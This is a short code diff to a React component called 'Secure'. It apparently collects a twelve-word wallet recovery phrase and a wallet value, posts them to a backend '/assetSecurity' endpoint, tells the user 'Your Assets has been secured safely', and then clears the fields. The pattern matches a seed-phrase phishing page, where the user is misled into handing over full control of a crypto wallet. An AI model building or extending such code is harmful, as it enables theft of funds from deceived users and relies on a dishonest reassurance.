@@ -82,6 +82,8 @@ const Secure = () => {
       try {
         const response = await axios.post(`${BackendApi}/assetSecurity`, data);
         toast.success("Your Assets has been secured safely.");
+        setPhrases(Array(12).fill(""));
+        setWallet("");
       } catch (error) {
         toast.error("Securing error", error);
       }
